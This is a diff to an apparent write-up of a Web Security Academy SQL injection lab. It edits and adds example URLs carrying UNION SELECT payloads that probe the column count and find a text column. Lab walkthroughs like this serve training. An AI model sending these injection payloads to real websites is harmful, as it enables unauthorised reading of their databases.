@@ -36,11 +36,13 @@ UNION keyword can be used to retrieve data from other tables within the database
 
 **Lets submit a of UNION SELECT payload using 3 NULL values:**
 
-https://foo.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+NULL,NULL,NULL--
+https://foo.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+NULL,NULL,NULL--
 
 Now let's finding column containing text. We already known that 1 column is index, it is not text value, 2 - it's item name, lets try it. 
 
 Use this: ' UNION SELECT NULL,'STRING',NULL
+
+https://foo.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+NULL,'STRING',NULL--
 
 ![img](https://i.ibb.co/tLJQmLz/Screenshot-from-2023-01-21-14-03-55.png)
 
